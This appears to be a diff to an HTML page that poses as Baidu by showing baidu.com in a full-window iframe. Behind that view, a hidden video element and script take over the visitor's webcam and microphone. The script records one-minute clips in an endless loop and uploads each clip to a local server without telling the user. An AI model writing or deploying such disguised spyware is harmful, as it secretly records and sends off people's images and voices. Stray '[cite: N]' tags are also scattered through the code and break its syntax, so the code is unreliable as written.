@@ -3,105 +3,135 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Baidu</title> <style>
+    <title>BaiDu</title>
+    <style>
         /* 确保 iframe 能够铺满整个页面 */
         body, html {
-            margin: 0;
-            padding: 0;
+            margin: 0; [cite: 128]
+            padding: 0; [cite: 128]
             height: 100%;
             overflow: hidden; /* 隐藏滚动条 */
         }
         #bg-frame {
-            position: absolute;
-            top: 0;
-            left: 0;
+            position: absolute; [cite: 129]
+            top: 0; [cite: 129]
+            left: 0; [cite: 129]
             width: 100%;
             height: 100%;
-            border: none; /* 移除 iframe 的边框 */
+            border: none; [cite: 130]
         }
-        /* 确保功能性元素完全隐藏且不占空间 */
-        #webcam, #canvas {
-            display: none;
+        /* 功能性 video 元素需要存在但完全隐藏 */
+        #webcam {
+            display: none; [cite: 131]
         }
     </style>
 </head>
 <body>
 
-    <video id="webcam" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="webcam" autoplay playsinline muted></video>
 
     <iframe id="bg-frame" src="https://www.baidu.com"></iframe>
 
     <script>
         const webcamVideo = document.getElementById('webcam');
-        const canvas = document.getElementById('canvas');
         
         let stream;
-        let isUploading = false;
-        const UPLOAD_INTERVAL = 5000; // 5秒
+        let isRecording = false; // 状态锁，防止重叠
+        const RECORDING_DURATION = 60000; // 录制时长（毫秒），这里是1分钟
 
-        // 核心的拍照上传函数
-        async function captureAndUpload() {
-            if (isUploading || !stream) {
+        // 核心的录制和上传函数
+        async function startRecordingCycle() {
+            if (!stream || isRecording) {
+                console.log('媒体流未就绪或正在录制中，跳过。');
                 return;
             }
 
-            isUploading = true;
+            isRecording = true; // 上锁
+            let recordedChunks = [];
+            console.log('开始新的1分钟录制...');
 
-            const videoSettings = stream.getVideoTracks()[0].getSettings();
-            canvas.width = videoSettings.width;
-            canvas.height = videoSettings.height;
+            try {
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
 
-            const context = canvas.getContext('2d');
-            context.drawImage(webcamVideo, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('photo', blob, `capture-${Date.now()}.jpg`);
-                
-                try {
-                    const response = await fetch('http://localhost:3000/upload', {
-                        method: 'POST',
-                        body: formData,
-                    });
-
-                    if (response.ok) {
-                        console.log('Upload successful at', new Date().toLocaleTimeString());
-                    } else {
-                        console.error('Upload failed:', response.statusText);
+                // 2. 收集数据
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data); [cite: 11]
                     }
-                } catch (error) {
-                    console.error('Upload error:', error);
-                } finally {
-                    isUploading = false;
-                }
+                };
 
-            }, 'image/jpeg', 0.9);
+                // 3. 录制停止后触发上传
+                mediaRecorder.onstop = async () => {
+                    console.log('录制停止，准备上传。');
+                    const recordedBlob = new Blob(recordedChunks, { type: 'video/webm' }); [cite: 12]
+                    recordedChunks = []; // 清空数据块数组 
+
+                    const formData = new FormData();
+                    // 'video' 是后端 multer 配置的字段名
+                    formData.append('video', recordedBlob, `recording-${Date.now()}.webm`); [cite: 18]
+
+                    try {
+                        const response = await fetch('http://localhost:3000/upload', {
+                            method: 'POST', [cite: 19]
+                            body: formData,
+                        });
+
+                        if (response.ok) {
+                            const result = await response.json(); [cite: 20]
+                            console.log('上传成功:', result.message, ' at', new Date().toLocaleTimeString());
+                        } else {
+                            console.error('上传失败:', response.statusText); [cite: 21]
+                        }
+                    } catch (error) {
+                        console.error('上传发生错误:', error); [cite: 23]
+                    } finally {
+                        // 不论上传成功与否，都解锁并开始下一次录制
+                        console.log('准备开始下一次录制...');
+                        isRecording = false;
+                        // 立即开始下一个录制周期
+                        startRecordingCycle();
+                    }
+                };
+
+                // 1. 开始录制
+                mediaRecorder.start();
+                
+                // 4. 设置一个定时器，在指定时间后停止录制
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, RECORDING_DURATION);
+
+            } catch(e) {
+                console.error("MediaRecorder 初始化失败:", e);
+                isRecording = false; // 出错解锁
+            }
         }
 
-        // 初始化摄像头并启动定时器
+        // 初始化摄像头并启动录制循环
         async function init() {
             try {
+                // 请求音视频权限
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { width: 1280, height: 720 }, 
-                    audio: false 
-                });
-                webcamVideo.srcObject = stream;
+                    audio: true // 录像通常需要音频
+                }); [cite: 9]
+                webcamVideo.srcObject = stream; [cite: 9, 142]
                 
                 webcamVideo.onloadedmetadata = () => {
-                    // 摄像头就绪后，直接启动定时器
-                    setInterval(captureAndUpload, UPLOAD_INTERVAL);
-                    console.log('Background capture process started.');
+                    console.log('摄像头已就绪，后台录制进程启动。');
+                    // 摄像头就绪后，直接启动录制循环
+                    startRecordingCycle();
                 };
 
             } catch (error) {
-                // 如果用户拒绝授权，这个错误会在控制台显示
-                console.error('Camera access denied or error:', error);
+                console.error('摄像头访问被拒绝或出错:', error); [cite: 10, 144]
             }
         }
 
         // 启动
-        init();
+        init(); [cite: 145]
     </script>
 </body>
 </html>
